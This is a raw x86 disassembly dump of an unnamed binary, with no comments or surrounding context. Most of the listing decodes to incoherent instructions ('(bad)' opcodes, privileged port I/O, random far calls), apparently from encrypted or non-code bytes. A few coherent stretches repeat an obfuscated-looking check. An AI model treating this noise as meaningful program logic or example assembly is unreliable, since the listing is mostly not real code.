  40b62d:	out    0xb9,al
  40b62f:	lahf   
  40b630:	std    
  40b631:	jecxz  0x40b6ac
  40b633:	xchg   esp,eax
  40b634:	call   0x225eebb1
  40b639:	pop    ds
  40b63a:	fwait
  40b63b:	std    
  40b63c:	mov    esi,0x1d74985b
  40b641:	jae    0x40b62f
  40b643:	imul   edx,esp,0xffffffc7
  40b646:	imul   ebp,DWORD PTR [esi+ecx*4-0x9],0x13aec10f
  40b64e:	popf   
  40b64f:	inc    edi
  40b650:	clc    
  40b651:	adc    BYTE PTR [esi+edi*8-0x7c],bh
  40b655:	jg     0x40b669
  40b657:	and    BYTE PTR [ebx-0x465b0a6f],ah
  40b65d:	fwait
  40b65e:	in     eax,dx
  40b65f:	dec    edi
  40b660:	iret   
  40b661:	test   al,0x16
  40b663:	dec    edx
  40b664:	pusha  
  40b665:	sar    BYTE PTR [edx+edx*8],0xac
  40b669:	push   ebx
  40b66a:	or     DWORD PTR [edi],ebx
  40b66c:	rol    BYTE PTR [eax],1
  40b66e:	mov    esi,0x3565839c
  40b673:	punpckhdq mm0,QWORD PTR [ebp-0x17d81935]
  40b67a:	mov    BYTE PTR [edi+eiz*1],dh
  40b67d:	push   ss
  40b67e:	adc    eax,0x24f92f91
  40b683:	hlt    
  40b684:	dec    edx
  40b685:	int    0xcd
  40b687:	ins    BYTE PTR es:[edi],dx
  40b688:	in     eax,0xd0
  40b68a:	enter  0x799,0x0
  40b68e:	ss retf 
  40b690:	xchg   ebp,eax
  40b691:	in     eax,0xaa
  40b693:	stos   BYTE PTR es:[edi],al
  40b694:	dec    ebx
  40b695:	mov    ecx,0x4b54a3ca
  40b69a:	jmp    0x40b6d8
  40b69c:	stc    
  40b69d:	pusha  
  40b69e:	bound  eax,QWORD PTR [ebp-0x6f]
  40b6a1:	inc    edi
  40b6a2:	jle    0x40b67c
  40b6a4:	jp     0x40b709
  40b6a6:	mov    cl,0xa9
  40b6a8:	mov    al,0x7f
  40b6aa:	jg     0x40b6ad
  40b6ac:	xor    ch,BYTE PTR [esp+eiz*8]
  40b6af:	enter  0xed3e,0xe
  40b6b3:	xor    BYTE PTR [edi+ebp*8+0x58e21249],0xb1
  40b6bb:	mov    al,0x57
  40b6bd:	rol    ebx,0x1
  40b6c0:	retf   
  40b6c1:	xchg   ebp,eax
  40b6c2:	ret    
  40b6c3:	rcr    ah,cl
  40b6c5:	loope  0x40b703
  40b6c7:	out    dx,al
  40b6c8:	mov    dl,0x94
  40b6ca:	xchg   ebx,eax
  40b6cb:	jg     0x40b743
  40b6cd:	hlt    
  40b6ce:	jae    0x40b69c
  40b6d0:	icebp  
  40b6d1:	or     ebx,esp
  40b6d3:	cli    
  40b6d4:	xchg   edi,eax
  40b6d5:	sbb    DWORD PTR [ecx+esi*1-0x69],ecx
  40b6d9:	mov    DWORD PTR [ebx-0x7d],edx
  40b6dc:	arpl   WORD PTR [esi],bx
  40b6de:	inc    eax
  40b6df:	call   0x7746:0x7fb7023b
  40b6e6:	sbb    BYTE PTR [esi],ch
  40b6e8:	and    edi,DWORD PTR [esi+ecx*2+0x1c6fb9e8]
  40b6ef:	jne    0x40b683
  40b6f1:	adc    bh,BYTE PTR [edx-0x1b]
  40b6f4:	cmp    edx,DWORD PTR [ebx+0x3b38b1bd]
  40b6fa:	data16 add al,0x3d
  40b6fd:	adc    eax,0x9a4c028
  40b702:	or     eax,DWORD PTR [edi-0x2a]
  40b705:	xlat   BYTE PTR ds:[ebx]
  40b706:	fcom   DWORD PTR [ecx]
  40b708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b709:	popf   
  40b70a:	xchg   edx,eax
  40b70b:	inc    ebx
  40b70c:	pop    esp
  40b70d:	sbb    ah,dl
  40b70f:	dec    esp
  40b710:	xlat   BYTE PTR ds:[ebx]
  40b711:	fsub   DWORD PTR [ebx+0x4eb087f7]
  40b717:	jg     0x40b750
  40b719:	and    esp,DWORD PTR [ecx+0x7a]
  40b71c:	in     al,0x19
  40b71e:	push   esi
  40b71f:	test   BYTE PTR [eax-0x62],al
  40b722:	cmp    BYTE PTR [ebx-0x71c1dd09],ch
  40b728:	sub    al,BYTE PTR [ebp-0x7d9a8ef0]
  40b72e:	mov    ds,WORD PTR [ebp-0x45]
  40b731:	std    
  40b732:	xor    al,BYTE PTR [ebx+0x36]
  40b735:	jo     0x40b73e
  40b737:	int    0x94
  40b739:	pop    ss
  40b73a:	adc    BYTE PTR [ecx+0x734ad848],0x79
  40b741:	sub    BYTE PTR [ebp+0x559f8e88],ah
  40b747:	mov    DWORD PTR [edx],ecx
  40b749:	lds    ebp,FWORD PTR [ebp+0xc1b5e49]
  40b74f:	je     0x40b7c0
  40b751:	mov    WORD PTR [ecx-0x60],ss
  40b754:	(bad)  
  40b755:	sti    
  40b756:	lea    ecx,[edx-0x47]
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	mov    eax,DWORD PTR [edx-0x2d]
  40b78d:	in     al,0xb2
  40b78f:	(bad)  
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	cmp    BYTE PTR [esi],0xc3
  40b799:	xchg   edi,eax
  40b79a:	mov    ecx,0xbaa72114
  40b79f:	ins    DWORD PTR es:[edi],dx
  40b7a0:	lods   al,BYTE PTR ds:[esi]
  40b7a1:	out    dx,al
  40b7a2:	les    ebx,FWORD PTR [edx+0x1e4a083]
  40b7a8:	mov    dh,0xae
  40b7aa:	int3   
  40b7ab:	ror    DWORD PTR [esp+ecx*2+0x1d],cl
  40b7af:	leave  
  40b7b0:	shr    DWORD PTR [eax+ebx*2+0x4f],0x7d
  40b7b5:	sbb    eax,edx
  40b7b7:	sbb    edi,eax
  40b7b9:	out    dx,al
  40b7ba:	rcr    DWORD PTR [eax-0x24],cl
  40b7bd:	mov    bl,BYTE PTR [edi*4+0x459764ff]
  40b7c4:	enter  0xad04,0xe9
  40b7c8:	cmp    eax,0xdbec5c03
  40b7cd:	and    DWORD PTR [esi],esp
  40b7cf:	push   es
  40b7d0:	lods   al,BYTE PTR ds:[esi]
  40b7d1:	jmp    0x40b82f
  40b7d3:	sbb    DWORD PTR [eax-0x7d],edx
  40b7d6:	rcr    BYTE PTR [ebp-0x24],cl
  40b7d9:	and    eax,0xa056980c
  40b7de:	xor    ch,BYTE PTR [ebx]
  40b7e0:	out    0x7,al
  40b7e2:	outs   dx,BYTE PTR ds:[esi]
  40b7e3:	inc    esi
  40b7e4:	sbb    dl,dh
  40b7e6:	pop    edi
  40b7e7:	cmp    al,0xf6
  40b7e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7ea:	mov    esi,0x3985feef
  40b7ef:	fisttp QWORD PTR [edx+0x313ff067]
  40b7f5:	push   esp
  40b7f6:	fisub  DWORD PTR [ecx]
  40b7f8:	in     al,dx
  40b7f9:	rcr    ah,cl
  40b7fb:	cwde   
  40b7fc:	(bad)  
  40b7fd:	mov    dl,0x48
  40b7ff:	and    DWORD PTR [edx],esi
  40b801:	pop    ecx
  40b802:	xchg   esi,eax
  40b803:	in     al,dx
  40b804:	xor    BYTE PTR [edx-0x6],cl
  40b807:	call   DWORD PTR [eax+0x3]
  40b80a:	mov    ebx,edx
  40b80c:	call   0x454af98
  40b811:	ja     0x40b79d
  40b813:	ja     0x40b83f
  40b815:	or     al,0x9c
  40b817:	cs dec ecx
  40b819:	xchg   ecx,eax
  40b81a:	(bad)  
  40b81b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b81c:	mov    ds:0xa1fcf8f3,al
  40b821:	mov    edx,DWORD PTR [eax]
  40b823:	aad    0x90
  40b825:	pop    edx
  40b826:	jmp    0x40b853
  40b828:	les    esp,FWORD PTR [esi-0x26]
  40b82b:	or     BYTE PTR [eax],0x67
  40b82e:	clc    
  40b82f:	jbe    0x40b8a9
  40b831:	pop    ss
  40b832:	cld    
  40b833:	mov    edi,0x24b145b7
  40b838:	sub    eax,0xcb05aab7
  40b83d:	retf   
  40b83e:	xchg   edi,eax
  40b83f:	imul   edi,DWORD PTR [esi+0x1e],0xb81476ea
  40b846:	pop    edx
  40b847:	mov    ebp,0x28d4ee72
  40b84c:	loope  0x40b871
  40b84e:	sbb    BYTE PTR [ecx-0x25],dh
  40b851:	inc    esp
  40b852:	pop    esp
  40b853:	retf   0x5948
  40b856:	xchg   BYTE PTR [edx+0x621b37d6],cl
  40b85c:	sub    al,al
  40b85e:	shl    BYTE PTR [edx],0xb3
  40b861:	scas   al,BYTE PTR es:[edi]
  40b862:	push   ebx
  40b863:	retf   0x6515
  40b866:	data16 in al,0xe0
  40b869:	sti    
  40b86a:	sbb    al,0x43
  40b86c:	leave  
  40b86d:	aam    0xdf
  40b86f:	ja     0x40b856
  40b871:	jne    0x40b8cb
  40b873:	mov    ebp,0x72f6f65d
  40b878:	mov    bh,0xa9
  40b87a:	push   esp
  40b87b:	mov    edx,0x10c20bf7
  40b880:	mov    dh,0x53
  40b882:	pandn  mm6,QWORD PTR [ecx+0x75c316a8]
  40b889:	pop    eax
  40b88a:	push   ss
  40b88b:	fstp   QWORD PTR [edx-0x418b5cc4]
  40b891:	call   0xe32caccd
  40b896:	xchg   ebx,eax
  40b897:	add    DWORD PTR [edi+0x2c085399],edi
  40b89d:	mov    esi,0x7c15759
  40b8a2:	xor    eax,DWORD PTR [edx-0x58960828]
  40b8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a9:	cmp    ecx,ebp
  40b8ab:	mov    al,0xea
  40b8ad:	fxch   st(2)
  40b8af:	imul   esp,DWORD PTR [edx+eiz*8-0x3d],0x887d77a6
  40b8b7:	lea    ebx,[ebp-0x2f431305]
  40b8bd:	and    ebp,DWORD PTR [edx]
  40b8bf:	iret   
  40b8c0:	cmc    
  40b8c1:	xchg   BYTE PTR [ebx],ch
  40b8c3:	fimul  DWORD PTR [edx]
  40b8c5:	pop    ss
  40b8c6:	es mov edi,0x708e93b5
  40b8cc:	or     BYTE PTR [eax-0x65177b8b],ch
  40b8d2:	arpl   dx,di
  40b8d4:	jl     0x40b8a9
  40b8d6:	jns    0x40b871
  40b8d8:	imul   ebp,DWORD PTR ds:0x3e4b5dd9,0xf454d369
  40b8e2:	aad    0xc
  40b8e4:	loopne 0x40b8bb
  40b8e6:	push   0x7a
  40b8e8:	jnp    0x40b905
  40b8ea:	mov    DWORD PTR [eax+0x40ec67b0],ebx
  40b8f0:	in     al,0x95
  40b8f2:	lock add DWORD PTR [ebp+0x12f70ab5],ecx
  40b8f9:	inc    eax
  40b8fa:	je     0x40b91b
  40b8fc:	outs   dx,BYTE PTR ds:[esi]
  40b8fd:	pop    ds
  40b8fe:	enter  0xe1aa,0x6
  40b902:	or     bh,bh
  40b904:	popa   
  40b905:	fidivr WORD PTR [eax-0x618f0497]
  40b90b:	xchg   ebp,eax
  40b90c:	mov    edx,0xa437a3ff
  40b911:	add    edi,esp
  40b913:	std    
  40b914:	ds mov edx,0xe0ba7d8e
  40b91a:	call   0xb61b7be0
  40b91f:	xchg   DWORD PTR [ebx-0x5c],edi
  40b922:	adc    al,0x35
  40b924:	sti    
  40b925:	pop    ebx
  40b926:	stc    
  40b927:	pop    esp
  40b928:	fs ins BYTE PTR es:[edi],dx
  40b92a:	cdq    
  40b92b:	xor    eax,0xb6fd8348
  40b930:	hlt    
  40b931:	mov    BYTE PTR [ecx+0x21ddcd5a],dh
  40b937:	imul   ecx,DWORD PTR [ebx+0x34],0xffffffce
  40b93b:	in     eax,0xdc
  40b93d:	daa    
  40b93e:	aas    
  40b93f:	(bad)  
  40b940:	mov    ah,0x11
  40b942:	xor    dh,bh
  40b944:	and    bl,BYTE PTR [edx+0x416a5f00]
  40b94a:	aaa    
  40b94b:	sub    BYTE PTR [edx],ah
  40b94d:	mov    bh,0xfd
  40b94f:	jp     0x40b8dd
  40b951:	icebp  
  40b952:	std    
  40b953:	and    al,0xf
  40b955:	jl     0x40b97c
  40b957:	lock push edx
  40b959:	pop    ss
  40b95a:	jp     0x40b9cd
  40b95c:	push   ebp
  40b95d:	mov    al,ds:0x20820483
  40b962:	inc    edx
  40b963:	or     BYTE PTR [ebx],al
  40b965:	in     eax,dx
  40b966:	dec    esp
  40b967:	(bad)  
  40b968:	test   DWORD PTR [eax],0x54049347
  40b96e:	mov    ebp,0xeb686dde
  40b973:	adc    dh,BYTE PTR [eax+edi*8+0x45]
  40b977:	ss xor al,bh
  40b97a:	push   eax
  40b97b:	aad    0x9
  40b97d:	mov    dl,0x68
  40b97f:	jnp    0x40b9cc
  40b981:	xchg   ch,al
  40b983:	push   es
  40b984:	test   al,0xf
  40b986:	jno    0x40b90c
  40b988:	mov    ds:0xa3dcdba2,eax
  40b98d:	aam    0x98
  40b98f:	lock in eax,dx
  40b991:	jns    0x40b9ef
  40b993:	push   esp
  40b994:	fidiv  DWORD PTR ds:0x41d9
  40b999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b99a:	js     0x40b9bc
  40b99c:	fcmovb st,st(5)
  40b99e:	mov    eax,ds:0x4532ce0e
  40b9a3:	lods   al,BYTE PTR ds:[esi]
  40b9a4:	imul   esp,DWORD PTR [edx+0x2583d67b],0xbf3e0b33
  40b9ae:	nop
  40b9af:	repz inc esi
  40b9b1:	push   ecx
  40b9b2:	loope  0x40b936
  40b9b4:	inc    ebp
  40b9b5:	imul   eax,DWORD PTR [edi+0x7a],0x1
  40b9b9:	xor    ecx,DWORD PTR [edx-0x646c363b]
  40b9bf:	dec    ebx
  40b9c0:	lahf   
  40b9c1:	iret   
  40b9c2:	push   ecx
  40b9c3:	stc    
  40b9c4:	mov    ss,WORD PTR [ebx]
  40b9c6:	je     0x92e8e2b7
  40b9cc:	sbb    BYTE PTR [esi+eiz*8],ch
  40b9cf:	jl     0x40b9cc
  40b9d1:	sti    
  40b9d2:	push   ss
  40b9d3:	dec    edi
  40b9d4:	xlat   BYTE PTR ds:[ebx]
  40b9d5:	jns    0x40b9c7
  40b9d7:	push   ds
  40b9d8:	clc    
  40b9d9:	fistp  DWORD PTR [edi-0x1fba7401]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x4ebba808],eax
  40ba0f:	into   
  40ba10:	in     al,dx
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	(bad)  
  40ba1a:	in     al,0x14
  40ba1c:	jecxz  0x40ba11
  40ba1e:	aas    
  40ba1f:	jo     0x40ba03
  40ba21:	jmp    0x40b9a6
  40ba23:	retf   0x1f4a
  40ba26:	int    0xdb
  40ba28:	and    ecx,edx
  40ba2a:	popa   
  40ba2b:	movhps xmm1,QWORD PTR [edi-0x4ce7f773]
  40ba32:	adc    eax,0xb78eeff6
  40ba37:	push   ebx
  40ba38:	mov    ecx,0xae11e316
  40ba3d:	ins    DWORD PTR es:[edi],dx
  40ba3e:	cmp    ebp,eax
  40ba40:	jge    0x40ba22
  40ba42:	inc    edx
  40ba43:	imul   esi,edi,0x555fd874
  40ba49:	mov    DWORD PTR [esi-0x5a197bba],ecx
  40ba4f:	jge    0x40ba91
  40ba51:	push   edx
  40ba52:	push   esi
  40ba53:	test   eax,0x648c61b4
  40ba58:	sub    BYTE PTR [esi+0x74],dh
  40ba5b:	test   BYTE PTR [esi+0x5b],ah
  40ba5e:	or     DWORD PTR [edi-0x3842f83a],edx
  40ba64:	stos   DWORD PTR es:[edi],eax
  40ba65:	fs cwde 
  40ba67:	popa   
  40ba68:	push   eax
  40ba69:	mov    eax,0xe25e7654
  40ba6e:	ds mov ch,0x55
  40ba71:	mov    es,WORD PTR [ebx-0x2c]
  40ba74:	js     0x40ba3d
  40ba76:	outs   dx,DWORD PTR ds:[esi]
  40ba77:	and    eax,0x7cc1f206
  40ba7c:	retf   
  40ba7d:	mov    bh,0x64
  40ba7f:	or     ecx,DWORD PTR [esi-0x730c7ec6]
  40ba85:	ins    DWORD PTR es:[edi],dx
  40ba86:	sub    al,al
  40ba88:	mov    ecx,0xb474a02
  40ba8d:	cmc    
  40ba8e:	adc    eax,0x5fa5a8b
  40ba93:	jl     0x40babc
  40ba95:	sbb    ebp,ebx
  40ba97:	jns    0x40ba5d
  40ba99:	iret   
  40ba9a:	(bad)  [eax-0x69]
  40ba9d:	les    esi,FWORD PTR [ecx]
  40ba9f:	out    0x82,eax
  40baa1:	das    
  40baa2:	call   0xddab:0x2d988ddb
  40baa9:	jmp    0x40ba94
  40baab:	out    dx,al
  40baac:	xor    al,0xe5
  40baae:	jb     0x40bab1
  40bab0:	mov    eax,0xbce88cca
  40bab5:	mov    dh,0xef
  40bab7:	jmp    0x40ba5c
  40bab9:	cmp    ah,0x14
  40babc:	and    BYTE PTR [edx+0x13],cl
  40babf:	lods   al,BYTE PTR ds:[esi]
  40bac0:	fsubr  st,st(0)
  40bac2:	cmc    
  40bac3:	mov    bh,0xac
  40bac5:	pop    edx
  40bac6:	push   esi
  40bac7:	xor    DWORD PTR [eax-0x345104f5],ecx
  40bacd:	test   ebp,esp
  40bacf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad0:	sub    ebp,0x5a39569e
  40bad6:	in     al,dx
  40bad7:	mov    dh,0x91
  40bad9:	pop    ss
  40bada:	dec    esp
  40badb:	jle    0x40bafb
  40badd:	dec    ebp
  40bade:	push   edi
  40badf:	pop    eax
  40bae0:	xor    bh,dh
  40bae2:	or     esp,edx
  40bae4:	push   0x24
  40bae6:	mov    cl,0xae
  40bae8:	xchg   ecx,eax
  40bae9:	push   esi
  40baea:	xchg   esp,eax
  40baeb:	mov    eax,edx
  40baed:	adc    eax,0xcac03ff6
  40baf2:	mov    bh,bl
  40baf4:	mov    DWORD PTR [esi-0x55985511],edx
  40bafa:	jnp    0x40bb51
  40bafc:	retf   0xae3e
  40baff:	jb     0x40badc
  40bb01:	push   edi
  40bb02:	push   ecx
  40bb03:	xor    ebx,DWORD PTR [esp+esi*8]
  40bb06:	ffreep st(4)
  40bb08:	test   DWORD PTR [ecx+edi*1+0x41],ecx
  40bb0c:	shl    BYTE PTR [ecx-0x43],cl
  40bb0f:	mov    ecx,0x2924ddc5
  40bb14:	xchg   ebx,eax
  40bb15:	neg    DWORD PTR [edi+0x5d]
  40bb18:	sub    BYTE PTR [ebx],dh
  40bb1a:	adc    al,0x97
  40bb1c:	jmp    0x40bb1f
  40bb1e:	xor    ch,cl
  40bb20:	and    DWORD PTR [edi+0x2d4eba02],0xffffff85
  40bb27:	or     eax,0xf6f6a575
  40bb2c:	es es int 0xf5
  40bb30:	imul   dl
  40bb32:	jl     0x40bb1c
  40bb34:	retf   
  40bb35:	cmp    esi,DWORD PTR [esi]
  40bb37:	nop
  40bb38:	lods   al,BYTE PTR ds:[esi]
  40bb39:	retf   0x2dbf
  40bb3c:	xchg   esp,eax
  40bb3d:	les    esp,FWORD PTR [ecx]
  40bb3f:	xor    al,al
  40bb41:	cli    
  40bb42:	jmp    FWORD PTR [ebx]
  40bb44:	into   
  40bb45:	xor    DWORD PTR ds:0x9af39c94,0x7e
  40bb4c:	ret    0x684e
  40bb4f:	shl    edi,1
  40bb51:	sbb    ecx,DWORD PTR [ebx+eax*1-0x1a]
  40bb55:	daa    
  40bb56:	or     ebp,ebx
  40bb58:	adc    DWORD PTR [edx],eax
  40bb5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb5b:	mov    cl,0x69
  40bb5d:	retf   0x63a1
  40bb60:	ins    BYTE PTR es:[edi],dx
  40bb61:	scas   al,BYTE PTR es:[edi]
  40bb62:	addr16 dec ecx
  40bb64:	adc    eax,0x11317711
  40bb69:	xchg   BYTE PTR ds:0x1c09e9e9,ah
  40bb6f:	mov    ds:0x7427ae8e,al
  40bb74:	dec    BYTE PTR [edi+ecx*4]
  40bb77:	and    ebx,eax
  40bb79:	xor    dh,BYTE PTR [ecx+eiz*1+0x2f68ad3f]
  40bb80:	ins    BYTE PTR es:[edi],dx
  40bb81:	adc    al,0x48
  40bb83:	dec    ebx
  40bb84:	xchg   ebx,eax
  40bb85:	push   0x7af6dd6a
  40bb8a:	adc    eax,0x5c605443
  40bb8f:	aad    0x31
  40bb91:	inc    ebp
  40bb92:	push   eax
  40bb93:	push   edi
  40bb94:	mov    eax,0x3f744bd2
  40bb99:	and    al,0x45
  40bb9b:	aad    0x34
  40bb9d:	sbb    DWORD PTR [ebp-0x442abf30],esi
  40bba3:	into   
  40bba4:	sub    BYTE PTR [eax+0x78],ch
  40bba7:	stos   DWORD PTR es:[edi],eax
  40bba8:	xchg   BYTE PTR [ebx+0x6e],ch
  40bbab:	inc    esp
  40bbac:	out    0xe5,al
  40bbae:	push   0x47
  40bbb0:	xchg   edi,eax
  40bbb1:	sbb    ebp,DWORD PTR [edi]
  40bbb3:	push   edi
  40bbb4:	shl    DWORD PTR [edi],0x57
  40bbb7:	lock add di,WORD PTR [ebx-0x651b738f]
  40bbbf:	call   0x99e1:0xb4c0cbd2
  40bbc6:	mov    BYTE PTR [eax],dl
  40bbc8:	sbb    eax,0x87f7f1d6
  40bbcd:	(bad)  
  40bbce:	in     eax,dx
  40bbcf:	loop   0x40bbc5
  40bbd1:	pushf  
  40bbd2:	mov    esi,0x6e3dd8ce
  40bbd7:	data16 icebp 
  40bbd9:	push   cs
  40bbda:	fldenv [ebp+0x20]
  40bbdd:	call   0x468ecaf3
  40bbe2:	mov    cl,BYTE PTR [ebx+0x45]
  40bbe5:	imul   ecx,edx,0xfc41a1fa
  40bbeb:	push   eax
  40bbec:	inc    ebx
  40bbed:	push   edx
  40bbee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbef:	mov    ebp,0xcd8ad254
  40bbf4:	push   eax
  40bbf5:	mov    eax,ds:0x62548ce3
  40bbfa:	adc    bh,BYTE PTR [ecx]
  40bbfc:	rcr    DWORD PTR [eax],0xf3
  40bbff:	jb     0x40bbc4
  40bc01:	jnp    0x40bc19
  40bc03:	cmp    eax,0xdc786f75
  40bc09:	push   esp
  40bc0a:	inc    eax
  40bc0b:	mov    WORD PTR [ecx-0x57c917ba],gs
  40bc11:	jae    0x40bbcd
  40bc13:	in     al,dx
  40bc14:	jg     0x40bc14
  40bc16:	adc    eax,0xe6e3e119
  40bc1b:	addr16 push 0xffffffc4
  40bc1e:	mov    ebx,0x36c90b45
  40bc23:	adc    al,BYTE PTR [eax+0x76bd4f19]
  40bc29:	fmul   DWORD PTR [edi+0x7430bf88]
  40bc2f:	mov    bh,ch
  40bc31:	add    eax,0xebaf1651
  40bc36:	rol    DWORD PTR [edi+0x5],cl
  40bc39:	mov    al,0xe2
  40bc3b:	das    
  40bc3c:	jecxz  0x40bcb1
  40bc3e:	fs push edx
  40bc40:	call   0x31a5:0x52a130f
  40bc47:	leave  
  40bc48:	daa    
  40bc49:	out    0xf3,al
  40bc4b:	test   bl,al
  40bc4d:	es push ecx
  40bc4f:	dec    ecx
  40bc50:	retf   
  40bc51:	inc    ecx
  40bc52:	jno    0x40bc45
  40bc54:	(bad)  
  40bc55:	push   edx
  40bc56:	push   cs
  40bc57:	mov    bh,0x50
  40bc59:	shr    DWORD PTR [ebx+0x4b],cl
  40bc5c:	(bad)  
  40bc5d:	adc    BYTE PTR [ebp+0xf],dh
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	mov    ebp,0xc6e14b3a
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	mov    DWORD PTR [ebx],0xc1ab29d9
  40bca7:	retf   0xfdbe
  40bcaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcab:	sbb    eax,eax
  40bcad:	dec    BYTE PTR [edx+0x71]
  40bcb0:	pop    es
  40bcb1:	push   ebx
  40bcb2:	sbb    edx,esp
  40bcb4:	cdq    
  40bcb5:	push   0xffffffb7
  40bcb7:	sub    bl,BYTE PTR [edi-0x35]
  40bcba:	push   cs
  40bcbb:	inc    ebx
  40bcbc:	fimul  WORD PTR [ebx]
  40bcbe:	adc    bl,bh
  40bcc0:	out    0xf1,eax
  40bcc2:	adc    BYTE PTR [eax-0x1f399e36],cl
  40bcc8:	jmp    0x40bcf3
  40bcca:	leave  
  40bccb:	icebp  
  40bccc:	retf   
  40bccd:	clc    
  40bcce:	fild   QWORD PTR [esi+ebp*4+0x7b]
  40bcd2:	out    0xee,eax
  40bcd4:	or     esp,0xe496512c
  40bcda:	sbb    BYTE PTR [ebx+0x61],al
  40bcdd:	call   0xca1:0xefd95f0e
  40bce4:	add    al,0x4
  40bce6:	xchg   ebp,eax
  40bce7:	lahf   
  40bce8:	ret    
  40bce9:	cmp    edx,ebp
  40bceb:	adc    edx,edi
  40bced:	stos   DWORD PTR es:[edi],eax
  40bcee:	loope  0x40bcfd
  40bcf0:	jb     0x40bd60
  40bcf2:	cs loopne 0x40bd63
  40bcf5:	aad    0xf6
  40bcf7:	mov    esp,0xadfcc0f4
  40bcfc:	in     al,0xc2
  40bcfe:	cld    
  40bcff:	push   eax
  40bd00:	loop   0x40bc8c
  40bd02:	and    ecx,eax
  40bd04:	sar    eax,cl
  40bd06:	je     0x40bd36
  40bd08:	fs push ds
  40bd0a:	fldenv [esi+edi*8-0xbd65bb6]
  40bd11:	cdq    
  40bd12:	loope  0x40bd38
  40bd14:	lds    esi,FWORD PTR [edx-0x122681d7]
  40bd1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd1b:	sti    
  40bd1c:	or     al,0x8f
  40bd1e:	jp     0x40bd1b
  40bd20:	bound  ecx,QWORD PTR [ebx+0x38]
  40bd23:	cld    
  40bd24:	test   eax,0xdd1d2a5e
  40bd29:	sar    BYTE PTR [eax],1
  40bd2b:	int3   
  40bd2c:	int    0x1f
  40bd2e:	(bad)  
  40bd2f:	pop    ds
  40bd30:	fwait
  40bd31:	jbe    0x40bdae
  40bd33:	iret   
  40bd34:	out    0x83,eax
  40bd36:	push   ebx
  40bd37:	jecxz  0x40bd24
  40bd39:	setb   BYTE PTR [edi]
  40bd3c:	mov    ds:0xaca6dc7c,al
  40bd41:	mov    eax,DWORD PTR [ecx]
  40bd43:	or     eax,0x265aaa05
  40bd48:	xchg   DWORD PTR [edx-0x3d],eax
  40bd4b:	stos   DWORD PTR es:[edi],eax
  40bd4c:	mov    eax,ds:0x6efe7ea7
  40bd51:	aam    0x6f
  40bd53:	or     al,0x84
  40bd55:	icebp  
  40bd56:	fnstenv [edx-0x17d9ef7e]
  40bd5c:	mov    esi,0x8ba5a4e7
  40bd61:	daa    
  40bd62:	push   0xfd5604b3
  40bd67:	mov    edx,0xb5b00401
  40bd6c:	arpl   WORD PTR [eax-0x79222b6f],sp
  40bd72:	dec    edi
  40bd73:	cmp    bl,BYTE PTR [esi]
  40bd75:	sbb    al,BYTE PTR [eax+0x4c33ebc0]
  40bd7b:	push   ebp
  40bd7c:	dec    ebp
  40bd7d:	mov    WORD PTR [ecx+0x6ee3e612],es
  40bd83:	scas   eax,DWORD PTR es:[edi]
  40bd84:	inc    esi
  40bd85:	sub    al,bh
  40bd87:	mov    dl,0x7f
  40bd89:	jmp    0xeb0d:0x9dad9ac5
  40bd90:	mov    eax,0x81f2f8cf
  40bd95:	xor    eax,0x6d968c34
  40bd9a:	test   eax,0xc4c6b0ea
  40bd9f:	ss xchg ecx,eax
  40bda1:	sub    eax,0xc2e2bfc3
  40bda6:	in     al,dx
  40bda7:	cmc    
  40bda8:	dec    ecx
  40bda9:	inc    ebp
  40bdaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdab:	call   0xfd1574a6
  40bdb0:	pop    esi
  40bdb1:	ss push ss
  40bdb3:	test   al,0x2a
  40bdb5:	sub    al,0x34
